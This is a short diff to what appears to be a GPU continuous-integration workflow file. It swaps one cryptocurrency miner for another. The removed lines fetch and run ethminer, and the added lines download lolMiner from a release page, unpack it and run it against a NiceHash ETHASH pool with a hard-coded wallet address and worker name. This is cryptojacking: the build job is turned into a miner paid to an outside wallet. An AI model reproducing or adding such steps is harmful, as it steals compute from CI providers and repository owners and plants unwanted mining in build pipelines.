@@ -8,10 +8,7 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
-
-tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
-
-cd bin
-
-./ethminer -G -P stratum://3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5.Grafith:x@daggerhashimoto.usa.nicehash.com:3353
+      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz 
+ tar xf lolMiner_v1.28a_Lin64.tar.gz 
+ cd 1.28a 
+ ./lolMiner --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5.Grafith1
